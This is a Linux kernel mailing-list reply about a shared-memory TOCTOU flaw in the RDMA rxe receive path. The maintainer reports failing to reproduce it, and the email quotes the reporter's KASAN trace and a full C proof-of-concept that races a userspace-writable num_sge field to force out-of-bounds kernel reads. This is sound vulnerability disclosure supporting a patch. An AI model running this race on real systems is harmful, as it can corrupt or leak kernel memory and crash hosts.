Return-Path: <linux-rdma+bounces-21062-lists+linux-rdma=lfdr.de@vger.kernel.org>
Delivered-To: lists+linux-rdma@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id qALWGrzrDWo04wUAu9opvQ
	(envelope-from <linux-rdma+bounces-21062-lists+linux-rdma=lfdr.de@vger.kernel.org>)
	for <lists+linux-rdma@lfdr.de>; Wed, 20 May 2026 19:13:32 +0200
X-Original-To: lists+linux-rdma@lfdr.de
Received: from tor.lore.kernel.org (tor.lore.kernel.org [IPv6:2600:3c04:e001:36c::12fc:5321])
	by mail.lfdr.de (Postfix) with ESMTPS id 949885931A8
	for <lists+linux-rdma@lfdr.de>; Wed, 20 May 2026 19:13:30 +0200 (CEST)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by tor.lore.kernel.org (Postfix) with ESMTP id 60B5C303C7CE
	for <lists+linux-rdma@lfdr.de>; Wed, 20 May 2026 17:05:47 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id A5E543FBB5B;
	Wed, 20 May 2026 17:04:29 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=linux.dev header.i=@linux.dev header.b="e09yFXJ6"
X-Original-To: linux-rdma@vger.kernel.org
Received: from out-174.mta1.migadu.com (out-174.mta1.migadu.com [95.215.58.174])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3CF1C3F23D9
	for <linux-rdma@vger.kernel.org>; Wed, 20 May 2026 17:04:26 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=95.215.58.174
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1779296669; cv=none; b=uqmdEYqD7wM6YnbE+kLZ8S4uav7IxfcOreN32tZNkyutBYQA27mYtaI6sDM80v5j/BO5wsjtt812AvIitePggeEcKmhVhTvgOHrhaVWn5vxAcgu6A9eeN5uULfpjgEnHebkCSR3A21MWqsoJdNftyXagzpgh9fLMgWnDVeYdZYU=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1779296669; c=relaxed/simple;
	bh=buwxRVAhnBJZlVlvto6dFJQhp9VY+2onnSKpKSxJiBQ=;
	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
	 In-Reply-To:Content-Type; b=V04AqrkOECc8BGfi56AAr8Dc/OmkQnSdlTTn+4J5VTvffUiaBU5sxhiTLLlbL/MqailkEQ3Z/JvTuI8WY/nq13ZvZTuDnYXqIkboMYkl/HHx/HJ5nHkDV/bLOrjQ/vXNICwGJWBg1LYashJCfH4g2LUtXQI2xAFokR+AyrK1j3M=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.dev; spf=pass smtp.mailfrom=linux.dev; dkim=pass (1024-bit key) header.d=linux.dev header.i=@linux.dev header.b=e09yFXJ6; arc=none smtp.client-ip=95.215.58.174
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.dev
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=linux.dev
Message-ID: <47169436-4652-440f-b9f1-325d281f9ed1@linux.dev>
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=linux.dev; s=key1;
	t=1779296664;
	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
	 to:to:cc:cc:mime-version:mime-version:content-type:content-type:
	 content-transfer-encoding:content-transfer-encoding:
	 in-reply-to:in-reply-to:references:references;
	bh=6Y5dKTz8n9Ab2zLK2F7PYI5tzqaCofRLxsR6O/Y5ePM=;
	b=e09yFXJ6zbQB2Peer8vpFPqJavEoRTgQK/ucC8zUZ6orQLFFUCcwLFh2ahuqfAknv+FHXf
	XURKx1TnektPhJ92OqjMDKMqhhuxoNGEf68v19FJZWEPJdmtCxuRzOig6w/v0gViNVJvF7
	0B8YBa7gOu+vmqKitN8deYd2ZnwfBGk=
Date: Wed, 20 May 2026 10:04:12 -0700
Precedence: bulk
X-Mailing-List: linux-rdma@vger.kernel.org
List-Id: <linux-rdma.vger.kernel.org>
List-Subscribe: <mailto:linux-rdma+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-rdma+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Subject: Re: [PATCH 0/2] RDMA/rxe: fix shared memory TOCTOU in receive path
To: Tristan Madani <tristmd@gmail.com>, Zhu Yanjun <yanjun.zhu@linux.dev>
Cc: Jason Gunthorpe <jgg@ziepe.ca>, Leon Romanovsky <leon@kernel.org>,
 zyjzyj2000@gmail.com, linux-rdma@vger.kernel.org
References: <20260518215040.1598586-1-tristan@talencesecurity.com>
 <0ae59679-5cc9-48e4-87e9-63299684acf8@linux.dev>
 <20260519145610.GA33515@unreal> <20260519150042.GL7702@ziepe.ca>
 <6a0ce47d.096dab79.284c84.5b30@mx.google.com>
 <6cb1092d-e3d6-4596-92e3-e0c7030680af@linux.dev>
 <177927858387.523368.14013568639772229181@gmail.com>
Content-Language: en-US
X-Report-Abuse: Please report any abuse attempt to abuse@migadu.com and include these headers.
From: "Yanjun.Zhu" <yanjun.zhu@linux.dev>
In-Reply-To: <177927858387.523368.14013568639772229181@gmail.com>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit
X-Migadu-Flow: FLOW_OUT
X-Spamd-Result: default: False [-2.16 / 15.00];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	DMARC_POLICY_ALLOW(-0.50)[linux.dev,none];
	R_DKIM_ALLOW(-0.20)[linux.dev:s=key1];
	R_SPF_ALLOW(-0.20)[+ip6:2600:3c04:e001:36c::/64:c];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	TAGGED_FROM(0.00)[bounces-21062-lists,linux-rdma=lfdr.de];
	RCVD_TLS_LAST(0.00)[];
	FREEMAIL_TO(0.00)[gmail.com,linux.dev];
	FREEMAIL_CC(0.00)[ziepe.ca,kernel.org,gmail.com,vger.kernel.org];
	TO_DN_SOME(0.00)[];
	RCVD_COUNT_THREE(0.00)[3];
	MIME_TRACE(0.00)[0:+];
	FORGED_SENDER_MAILLIST(0.00)[];
	FROM_HAS_DN(0.00)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	RCPT_COUNT_FIVE(0.00)[6];
	NEURAL_HAM(-0.00)[-1.000];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[yanjun.zhu@linux.dev,linux-rdma@vger.kernel.org];
	DKIM_TRACE(0.00)[linux.dev:+];
	MID_RHS_MATCH_FROM(0.00)[];
	ASN(0.00)[asn:63949, ipnet:2600:3c04::/32, country:SG];
	TAGGED_RCPT(0.00)[linux-rdma];
	MISSING_XM_UA(0.00)[];
	DBL_BLOCKED_OPENRESOLVER(0.00)[tor.lore.kernel.org:rdns,tor.lore.kernel.org:helo,linux.dev:mid,linux.dev:dkim,talencesecurity.com:email]
X-Rspamd-Queue-Id: 949885931A8
X-Rspamd-Action: no action
X-Rspamd-Server: lfdr


On 5/20/26 5:03 AM, Tristan Madani wrote:
> On Tue, 19 May 2026, Yanjun.Zhu wrote:
>> yes. Please provide a reproducer.
> Below is a reproducer and KASAN trace showing the OOB reads.
>
> The program creates two UD QPs over an RXE loopback device, locates
> the receiver's mmap'd receive queue buffer via /proc/self/maps, and
> races the WQE's num_sge field from userspace while driving loopback
> traffic. rxe_resp_check_length() in rxe_resp.c reads num_sge directly
> from the shared buffer on each loop iteration:
>
>      for (i = 0; i < qp->resp.wqe->dma.num_sge; i++)
>          recv_buffer_len += qp->resp.wqe->dma.sge[i].length;
>
> Inflating num_sge from 1 to 200 causes the loop to walk sge[] past
> the WQE boundary and out of the queue buffer's vmalloc allocation.
> On a KASAN kernel this produces hundreds of vmalloc-out-of-bounds
> reports within a couple of iterations.
>
> Setup (needs loopback with IPv6 for the RXE GID resolution):
>
>    # modprobe rdma_rxe
>    # rdma link add rxe0 type rxe netdev lo
>    # ip -6 addr add fe80::200:ff:fe00:0/128 dev lo
>    # ip -6 neigh add fe80::200:ff:fe00:0 lladdr 00:00:00:00:00:00 \
>          dev lo nud permanent
>
> Build:
>
>    $ gcc -O2 -Wall -o rxe-toctou-repro rxe-toctou-repro.c \
>          -libverbs -lpthread
>
> Run (kernel must have CONFIG_KASAN=y CONFIG_KASAN_VMALLOC=y, >= 2 CPUs):
>
>    # ./rxe-toctou-repro
>    # dmesg | grep -c 'BUG: KASAN'
>    788

Thanks Tristan. Today I followed the steps to make tests, but failed to 
reproduce. The steps are as below:

root@debian:# modprobe -v rdma_rxe

insmod /lib/modules/6.12.86+deb13-amd64/kernel/net/ipv4/udp_tunnel.ko.xz
insmod 
/lib/modules/6.12.86+deb13-amd64/kernel/net/ipv6/ip6_udp_tunnel.ko.xz
insmod 
/lib/modules/6.12.86+deb13-amd64/kernel/drivers/infiniband/core/ib_core.ko.xz 

insmod 
/lib/modules/6.12.86+deb13-amd64/kernel/drivers/infiniband/core/ib_uverbs.ko.xz 

insmod 
/lib/modules/6.12.86+deb13-amd64/kernel/drivers/infiniband/sw/rxe/rdma_rxe.ko.xz 

root@debian:# rdma link add rxe0 type rxe netdev lo
root@debian:# ip -6 addr add fe80::200:ff:fe00:0/128 dev lo
root@debian:# ip -6 neigh add fe80::200:ff:fe00:0 lladdr 
00:00:00:00:00:00 dev lo nud permanent
root@debian:# gcc -O2 -Wall -o rxe-toctou-repro test.c -libverbs -lpthread
root@debian:# ./rxe-toctou-repro
[*] RXE shared-memory TOCTOU reproducer
[*] Target: non-SRQ recv path reads WQE from mmap
[*]         without copy -- num_sge is raceable.
[*] UD check_length() iterates sge[] with mmap'd num_sge
[*]   as the loop bound -- inflating it walks OOB.

[+] Device: rxe0
[+] RQ buffer at 0x7f3404a2d000 (log2_elem=6, mask=0x1)
[+] UD QPs: sender=17, receiver=18
[*] Racing 500 iterations...

[!] Timeout at iter 151

[*] 152/500 iterations completed
[*] 0 WC errors observed (race manifestation)
[*] Check dmesg:
       dmesg | grep -A10 'BUG: KASAN'
     Expected: vmalloc-out-of-bounds in rxe_resp_check_length
     or slab-out-of-bounds in copy_data
root@debian:# dmesg | grep -c 'BUG: KASAN'
0
root@debian:# uname -a

Linux debian 6.12.86+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.86-1 
(2026-05-08) x86_64 GNU/Linux


Zhu Yanjun

>
> KASAN output (kernel 6.8.12+, QEMU 4 CPUs, 4G RAM):
>
> [   22.004789] BUG: KASAN: vmalloc-out-of-bounds in rxe_responder+0x2955/0x5520 [rdma_rxe]
> [   22.006023] Read of size 4 at addr ffffc90000061200 by task rxe-repro/291
> [   22.006927]
> [   22.007176] CPU: 2 PID: 291 Comm: rxe-repro Tainted: G            E      6.8.12+ #9
> [   22.008209] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
> [   22.009592] Call Trace:
> [   22.009942]  <TASK>
> [   22.010258]  dump_stack_lvl+0xe9/0x170
> [   22.010799]  print_report+0xd2/0x670
> [   22.013360]  kasan_report+0xee/0x130
> [   22.013883]  ? rxe_responder+0x2955/0x5520 [rdma_rxe]
> [   22.015597]  __asan_load4+0x8e/0xd0
> [   22.016131]  rxe_responder+0x2955/0x5520 [rdma_rxe]
> [   22.023659]  do_task+0x115/0x400 [rdma_rxe]
> [   22.024503]  rxe_run_task+0xbd/0xe0 [rdma_rxe]
> [   22.025985]  rxe_resp_queue_pkt+0xa8/0xc0 [rdma_rxe]
> [   22.026927]  rxe_rcv+0x587/0xe70 [rdma_rxe]
> [   22.027800]  rxe_xmit_packet+0x2f5/0x8c0 [rdma_rxe]
> [   22.028985]  rxe_requester+0x125e/0x2ae0 [rdma_rxe]
> [   22.029860]  do_task+0x115/0x400 [rdma_rxe]
> [   22.030700]  rxe_run_task+0xbd/0xe0 [rdma_rxe]
> [   22.031500]  rxe_post_send+0x823/0x11e0 [rdma_rxe]
> [   22.032500]  ib_uverbs_post_send+0xb57/0xd80 [ib_uverbs]
> [   22.033500]  ib_uverbs_write+0x992/0xd20 [ib_uverbs]
> [   22.034500]  vfs_write+0x20f/0xb80
> [   22.035500]  ksys_write+0x1e7/0x230
> [   22.036500]  </TASK>
>
> The buggy address belongs to a 1-page vmalloc region starting at
> 0xffffc90000061000 allocated at rxe_queue_init+0x1f1/0x2a0 [rdma_rxe]
>
> The queue buffer is 512 bytes (384-byte header + 128 bytes of data for
> 2 WQE slots at 64 bytes each). The first OOB read lands at offset
> 0x200 from the allocation base -- exactly the byte past valid data.
> The reads walk at a 16-byte stride matching sizeof(struct rxe_sge):
>
> [   22.006023] Read of size 4 at addr ffffc90000061200 by task rxe-repro/291
> [   22.107680] Read of size 4 at addr ffffc90000061210 by task rxe-repro/291
> [   22.222765] Read of size 4 at addr ffffc90000061220 by task rxe-repro/291
> [   22.344365] Read of size 4 at addr ffffc90000061230 by task rxe-repro/291
> [   22.459861] Read of size 4 at addr ffffc90000061240 by task rxe-repro/291
>
> The same shared-memory TOCTOU also affects copy_data() for RC/UC QPs,
> where dma->num_sge and dma->sge[].lkey are read from the mmap without
> copy -- the patches address both paths by copying the WQE to kernel
> memory and validating num_sge against the QP's max_sge, matching what
> the SRQ path already does.
>
> ---8<---
> /*
>   * rxe-toctou-repro.c - RXE shared memory TOCTOU in non-SRQ receive path
>   *
>   * Demonstrates that check_resource() in rxe_resp.c sets qp->resp.wqe
>   * to point directly into the userspace-writable mmap'd receive queue
>   * buffer, without making a local copy. All subsequent reads of WQE
>   * fields (num_sge, sge[].lkey, sge[].addr) come from this shared
>   * memory that a concurrent userspace thread can modify at any time.
>   *
>   * The SRQ path is already safe -- get_srq_wqe() validates num_sge
>   * against max_sge and memcpy's the WQE to kernel memory. The comment
>   * there says "don't trust user space data". The non-SRQ path has
>   * neither the copy nor the validation:
>   *
>   *   qp->resp.wqe = queue_head(qp->rq.queue, QUEUE_TYPE_FROM_CLIENT);
>   *
>   * For UD/GSI QPs, check_length() iterates all SGEs without any copy:
>   *
>   *   for (i = 0; i < qp->resp.wqe->dma.num_sge; i++)
>   *       recv_buffer_len += qp->resp.wqe->dma.sge[i].length;
>   *
>   * By inflating num_sge from userspace, the loop walks past the WQE's
>   * allocated SGE slots into adjacent queue entries or past the queue
>   * buffer allocation boundary.
>   *
>   * On a KASAN kernel with CONFIG_KASAN_VMALLOC=y, this triggers:
>   *   BUG: KASAN: vmalloc-out-of-bounds in rxe_resp_check_length
>   *
>   * Without KASAN, the observable effect is the kernel computing a
>   * bogus recv_buffer_len from OOB memory, and copy_data() later
>   * calling lookup_mr() with garbage lkey values from OOB SGEs.
>   *
>   * For RC/UC QPs, the same shared pointer feeds copy_data() where
>   * dma->num_sge controls the SGE iteration loop and dma->sge[].lkey
>   * drives lookup_mr() -- all from the writable mmap.
>   *
>   * Setup:
>   *   modprobe rdma_rxe
>   *   rdma link add rxe0 type rxe netdev lo
>   *   ip -6 addr add fe80::200:ff:fe00:0/128 dev lo
>   *   ip -6 neigh add fe80::200:ff:fe00:0 lladdr 00:00:00:00:00:00 \
>   *       dev lo nud permanent
>   *
>   * Build:
>   *   gcc -O2 -Wall -o rxe-toctou-repro rxe-toctou-repro.c \
>   *       -libverbs -lpthread
>   *
>   * Run (needs >= 2 CPUs for the race):
>   *   ./rxe-toctou-repro
>   *   dmesg | grep -A10 'BUG: KASAN'
>   *
>   * Tristan Madani <tristan@talencesecurity.com>
>   */
>
> #define _GNU_SOURCE
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <unistd.h>
> #include <pthread.h>
> #include <sched.h>
> #include <stdint.h>
> #include <stdatomic.h>
> #include <errno.h>
> #include <infiniband/verbs.h>
>
> /* ------------------------------------------------------------------ */
> /* Queue buffer header -- from include/uapi/rdma/rdma_user_rxe.h      */
> /* ------------------------------------------------------------------ */
>
> struct rxe_queue_buf {
> 	uint32_t log2_elem_size;
> 	uint32_t index_mask;
> 	uint32_t pad_1[30];
> 	uint32_t producer_index;
> 	uint32_t pad_2[31];
> 	uint32_t consumer_index;
> 	uint32_t pad_3[31];
> 	uint8_t  data[];
> };
>
> /*
>   * rxe_recv_wqe byte layout:
>   *   +0   wr_id          (u64)
>   *   +8   reserved        (u32)
>   *   +12  padding         (u32)
>   *   --- rxe_dma_info ---
>   *   +16  dma.length      (u32)
>   *   +20  dma.resid       (u32)
>   *   +24  dma.cur_sge     (u32)
>   *   +28  dma.num_sge     (u32)  <-- race target
>   *   +32  dma.sge_offset  (u32)
>   *   +36  dma.reserved    (u32)
>   *   +40  dma.sge[0]      (16 bytes: addr u64, length u32, lkey u32)
>   *
>   * With max_recv_sge=1: total 56 bytes, rounded to 64 => log2_elem = 6.
>   */
> #define WQE_NUM_SGE_OFF   28
> #define RQ_LOG2_ELEM      6
>
> /* Walk ~3 KB past the WQE -- enough to escape a 512-byte queue buffer */
> #define INJECTED_NUM_SGE  200
>
> #define BUF_SIZE     4096
> #define SEND_SIZE    64
> #define QKEY         0x11111111
> #define ITERATIONS   500
> #define MAX_MAPS     8192
>
> /* ------------------------------------------------------------------ */
> /* Racer thread                                                       */
> /* ------------------------------------------------------------------ */
>
> static atomic_int         racer_state;   /* 0=idle, 1=racing, 2=exit */
> static volatile uint32_t *num_sge_ptr;
>
> static void *racer_fn(void *arg)
> {
> 	(void)arg;
> 	for (;;) {
> 		int s = atomic_load_explicit(&racer_state,
> 					     memory_order_acquire);
> 		if (s == 2)
> 			break;
> 		if (s == 1) {
> 			/*
> 			 * Continuously inflate num_sge in the mmap'd WQE.
> 			 * The kernel's check_length() re-reads this field
> 			 * as the loop bound -- every write here can trigger
> 			 * an OOB SGE walk.
> 			 */
> 			*num_sge_ptr = INJECTED_NUM_SGE;
> 		}
> 	}
> 	return NULL;
> }
>
> /* ------------------------------------------------------------------ */
> /* Mmap scanning -- find the receiver's RQ buffer after QP creation   */
> /* ------------------------------------------------------------------ */
>
> struct map_ent { uintptr_t start, end; };
>
> static int snap_maps(struct map_ent *out, int max)
> {
> 	FILE *f = fopen("/proc/self/maps", "r");
> 	char line[256];
> 	int n = 0;
>
> 	if (!f)
> 		return 0;
> 	while (fgets(line, sizeof(line), f) && n < max) {
> 		unsigned long s, e;
> 		if (sscanf(line, "%lx-%lx", &s, &e) == 2) {
> 			out[n].start = s;
> 			out[n].end   = e;
> 			n++;
> 		}
> 	}
> 	fclose(f);
> 	return n;
> }
>
> static struct rxe_queue_buf *find_rq_buf(struct map_ent *pre, int np,
> 					 struct map_ent *post, int na)
> {
> 	for (int i = 0; i < na; i++) {
> 		int seen = 0;
>
> 		for (int j = 0; j < np; j++) {
> 			if (post[i].start == pre[j].start) {
> 				seen = 1;
> 				break;
> 			}
> 		}
> 		if (!seen) {
> 			struct rxe_queue_buf *b = (void *)post[i].start;
>
> 			if (b->log2_elem_size == RQ_LOG2_ELEM)
> 				return b;
> 		}
> 	}
> 	return NULL;
> }
>
> /* ------------------------------------------------------------------ */
> /* QP helpers -- UD over RXE loopback                                 */
> /* ------------------------------------------------------------------ */
>
> static struct ibv_qp *make_ud_qp(struct ibv_pd *pd, struct ibv_cq *cq,
> 				 int max_recv_wr)
> {
> 	struct ibv_qp_init_attr a = {
> 		.send_cq  = cq,
> 		.recv_cq  = cq,
> 		.cap = {
> 			.max_send_wr  = 16,
> 			.max_recv_wr  = max_recv_wr,
> 			.max_send_sge = 1,
> 			.max_recv_sge = 1,
> 		},
> 		.qp_type = IBV_QPT_UD,
> 	};
> 	return ibv_create_qp(pd, &a);
> }
>
> static int ud_init(struct ibv_qp *qp)
> {
> 	struct ibv_qp_attr a = {
> 		.qp_state   = IBV_QPS_INIT,
> 		.pkey_index = 0,
> 		.port_num   = 1,
> 		.qkey       = QKEY,
> 	};
> 	return ibv_modify_qp(qp, &a,
> 		IBV_QP_STATE | IBV_QP_PKEY_INDEX |
> 		IBV_QP_PORT  | IBV_QP_QKEY);
> }
>
> static int ud_rtr(struct ibv_qp *qp)
> {
> 	struct ibv_qp_attr a = { .qp_state = IBV_QPS_RTR };
> 	return ibv_modify_qp(qp, &a, IBV_QP_STATE);
> }
>
> static int ud_rts(struct ibv_qp *qp)
> {
> 	struct ibv_qp_attr a = { .qp_state = IBV_QPS_RTS, .sq_psn = 0 };
> 	return ibv_modify_qp(qp, &a, IBV_QP_STATE | IBV_QP_SQ_PSN);
> }
>
> /* ------------------------------------------------------------------ */
> /* Main                                                               */
> /* ------------------------------------------------------------------ */
>
> int main(void)
> {
> 	struct ibv_device **dl;
> 	struct ibv_context *ctx;
> 	struct ibv_pd *pd;
> 	struct ibv_cq *cq;
> 	struct ibv_mr *smr, *rmr;
> 	struct ibv_qp *qps, *qpr;
> 	struct ibv_ah *ah;
> 	union ibv_gid gid;
> 	static char sbuf[BUF_SIZE], rbuf[BUF_SIZE];
> 	struct map_ent *m1, *m2;
> 	struct rxe_queue_buf *rqb;
> 	int n1, n2, ret;
>
> 	printf("[*] RXE shared-memory TOCTOU reproducer\n"
> 	       "[*] Target: non-SRQ recv path reads WQE from mmap\n"
> 	       "[*]         without copy -- num_sge is raceable.\n"
> 	       "[*] UD check_length() iterates sge[] with mmap'd num_sge\n"
> 	       "[*]   as the loop bound -- inflating it walks OOB.\n\n");
>
> 	/* ---- Device ---- */
>
> 	dl = ibv_get_device_list(NULL);
> 	if (!dl || !dl[0]) {
> 		fprintf(stderr, "[-] No RDMA device. Run:\n"
> 			"      modprobe rdma_rxe\n"
> 			"      rdma link add rxe0 type rxe netdev lo\n");
> 		return 1;
> 	}
> 	ctx = ibv_open_device(dl[0]);
> 	if (!ctx) {
> 		perror("[-] ibv_open_device");
> 		return 1;
> 	}
> 	printf("[+] Device: %s\n", ibv_get_device_name(dl[0]));
>
> 	ret = ibv_query_gid(ctx, 1, 0, &gid);
> 	if (ret) {
> 		fprintf(stderr, "[-] ibv_query_gid failed\n");
> 		return 1;
> 	}
>
> 	/* ---- Resources ---- */
>
> 	pd  = ibv_alloc_pd(ctx);
> 	cq  = ibv_create_cq(ctx, 256, NULL, NULL, 0);
> 	if (!pd || !cq) {
> 		fprintf(stderr, "[-] PD/CQ creation failed\n");
> 		return 1;
> 	}
>
> 	memset(sbuf, 'A', sizeof(sbuf));
> 	smr = ibv_reg_mr(pd, sbuf, sizeof(sbuf), IBV_ACCESS_LOCAL_WRITE);
> 	rmr = ibv_reg_mr(pd, rbuf, sizeof(rbuf), IBV_ACCESS_LOCAL_WRITE);
> 	if (!smr || !rmr) {
> 		fprintf(stderr, "[-] MR registration failed\n");
> 		return 1;
> 	}
>
> 	/* ---- QPs ---- */
>
> 	/* Create sender first, then snapshot, then receiver.
> 	 * New mmaps after the snapshot belong to the receiver QP. */
> 	qps = make_ud_qp(pd, cq, 1);
> 	if (!qps) {
> 		perror("[-] sender QP");
> 		return 1;
> 	}
>
> 	m1 = calloc(MAX_MAPS, sizeof(*m1));
> 	m2 = calloc(MAX_MAPS, sizeof(*m2));
> 	n1 = snap_maps(m1, MAX_MAPS);
>
> 	qpr = make_ud_qp(pd, cq, 1);
> 	if (!qpr) {
> 		perror("[-] receiver QP");
> 		return 1;
> 	}
>
> 	n2  = snap_maps(m2, MAX_MAPS);
> 	rqb = find_rq_buf(m1, n1, m2, n2);
> 	free(m1);
> 	free(m2);
>
> 	if (!rqb) {
> 		fprintf(stderr, "[-] RQ mmap buffer not found\n"
> 			"    (expected log2_elem_size=%d)\n", RQ_LOG2_ELEM);
> 		return 1;
> 	}
> 	printf("[+] RQ buffer at %p (log2_elem=%u, mask=0x%x)\n",
> 	       (void *)rqb, rqb->log2_elem_size, rqb->index_mask);
>
> 	/* ---- State transitions ---- */
>
> 	ret  = ud_init(qps) | ud_init(qpr);
> 	ret |= ud_rtr(qps)  | ud_rtr(qpr);
> 	ret |= ud_rts(qps)  | ud_rts(qpr);
> 	if (ret) {
> 		fprintf(stderr, "[-] QP transitions failed\n");
> 		return 1;
> 	}
> 	printf("[+] UD QPs: sender=%u, receiver=%u\n",
> 	       qps->qp_num, qpr->qp_num);
>
> 	/* ---- Address handle for loopback ---- */
>
> 	struct ibv_ah_attr ah_attr = {
> 		.is_global = 1,
> 		.port_num  = 1,
> 		.grh = {
> 			.dgid       = gid,
> 			.sgid_index = 0,
> 			.hop_limit  = 1,
> 		},
> 	};
> 	ah = ibv_create_ah(pd, &ah_attr);
> 	if (!ah) {
> 		perror("[-] ibv_create_ah");
> 		return 1;
> 	}
>
> 	/* ---- Racer thread ---- */
>
> 	pthread_t racer;
> 	atomic_store(&racer_state, 0);
> 	pthread_create(&racer, NULL, racer_fn, NULL);
>
> 	/* ---- Race loop ---- */
>
> 	printf("[*] Racing %d iterations...\n\n", ITERATIONS);
> 	int hits = 0, completed = 0;
>
> 	for (int i = 0; i < ITERATIONS; i++) {
> 		/* Pause racer while we reconfigure the target pointer */
> 		atomic_store_explicit(&racer_state, 0,
> 				      memory_order_release);
>
> 		/* Which queue slot does this recv occupy? */
> 		uint32_t slot = i & rqb->index_mask;
> 		uint8_t *wqe  = rqb->data +
> 				((uint32_t)slot << rqb->log2_elem_size);
> 		num_sge_ptr = (volatile uint32_t *)(wqe + WQE_NUM_SGE_OFF);
>
> 		/* Post receive -- writes num_sge=1 into the shared buffer */
> 		struct ibv_sge rsge = {
> 			.addr   = (uintptr_t)rbuf,
> 			.length = BUF_SIZE,
> 			.lkey   = rmr->lkey,
> 		};
> 		struct ibv_recv_wr rwr = {
> 			.wr_id   = i,
> 			.sg_list = &rsge,
> 			.num_sge = 1,
> 		};
> 		struct ibv_recv_wr *bad_rwr;
>
> 		ret = ibv_post_recv(qpr, &rwr, &bad_rwr);
> 		if (ret) {
> 			fprintf(stderr, "[-] post_recv fail iter %d: %s\n",
> 				i, strerror(ret));
> 			break;
> 		}
>
> 		/*
> 		 * Arm the racer. From this point it continuously writes
> 		 * INJECTED_NUM_SGE (200) to the WQE's num_sge field in
> 		 * the mmap'd buffer. When the kernel enters check_length()
> 		 * it will iterate:
> 		 *
> 		 *   for (i = 0; i < qp->resp.wqe->dma.num_sge; i++)
> 		 *       recv_buffer_len += qp->resp.wqe->dma.sge[i].length;
> 		 *
> 		 * With num_sge=200, sge[1]..sge[199] are past the WQE
> 		 * boundary (each rxe_recv_wqe is 64 bytes with 1 SGE;
> 		 * sge[0] starts at byte 40 within the 64-byte element).
> 		 */
> 		atomic_store_explicit(&racer_state, 1,
> 				      memory_order_release);
>
> 		/*
> 		 * Also write directly -- the racer reinforces this, but
> 		 * one deterministic write here guarantees the kernel sees
> 		 * the inflated value even if the racer thread hasn't been
> 		 * scheduled yet.
> 		 */
> 		*num_sge_ptr = INJECTED_NUM_SGE;
>
> 		/* Post send -- triggers receive processing in the kernel */
> 		struct ibv_sge ssge = {
> 			.addr   = (uintptr_t)sbuf,
> 			.length = SEND_SIZE,
> 			.lkey   = smr->lkey,
> 		};
> 		struct ibv_send_wr swr = {
> 			.wr_id      = i,
> 			.sg_list    = &ssge,
> 			.num_sge    = 1,
> 			.opcode     = IBV_WR_SEND,
> 			.send_flags = IBV_SEND_SIGNALED,
> 			.wr.ud = {
> 				.ah          = ah,
> 				.remote_qpn  = qpr->qp_num,
> 				.remote_qkey = QKEY,
> 			},
> 		};
> 		struct ibv_send_wr *bad_swr;
>
> 		ret = ibv_post_send(qps, &swr, &bad_swr);
> 		if (ret) {
> 			fprintf(stderr, "[-] post_send fail iter %d\n", i);
> 			break;
> 		}
>
> 		/* Collect completions (send + recv for UD) */
> 		struct ibv_wc wc;
> 		int got = 0, tmo = 0;
>
> 		while (got < 2 && tmo < 200000) {
> 			int ne = ibv_poll_cq(cq, 1, &wc);
>
> 			if (ne > 0) {
> 				got++;
> 				if (wc.status != IBV_WC_SUCCESS) {
> 					hits++;
> 					if (hits <= 5)
> 						printf("[!] iter %d: %s "
> 						       "(opcode=%d)\n",
> 						       i,
> 						       ibv_wc_status_str(
> 							   wc.status),
> 						       wc.opcode);
> 				}
> 			} else {
> 				tmo++;
> 			}
> 		}
>
> 		completed = i + 1;
>
> 		if (tmo >= 200000) {
> 			printf("[!] Timeout at iter %d\n", i);
> 			break;
> 		}
>
> 		/* Restore num_sge for the next ibv_post_recv */
> 		atomic_store_explicit(&racer_state, 0,
> 				      memory_order_release);
> 		*num_sge_ptr = 1;
> 	}
>
> 	/* ---- Shutdown ---- */
>
> 	atomic_store_explicit(&racer_state, 2, memory_order_release);
> 	pthread_join(racer, NULL);
>
> 	printf("\n[*] %d/%d iterations completed\n", completed, ITERATIONS);
> 	printf("[*] %d WC errors observed (race manifestation)\n", hits);
> 	printf("[*] Check dmesg:\n"
> 	       "      dmesg | grep -A10 'BUG: KASAN'\n"
> 	       "    Expected: vmalloc-out-of-bounds in "
> 	       "rxe_resp_check_length\n"
> 	       "    or slab-out-of-bounds in copy_data\n");
>
> 	ibv_destroy_ah(ah);
> 	ibv_destroy_qp(qps);
> 	ibv_destroy_qp(qpr);
> 	ibv_dereg_mr(smr);
> 	ibv_dereg_mr(rmr);
> 	ibv_destroy_cq(cq);
> 	ibv_dealloc_pd(pd);
> 	ibv_close_device(ctx);
> 	ibv_free_device_list(dl);
> 	return 0;
> }
> ---8<---
>
> Tristan

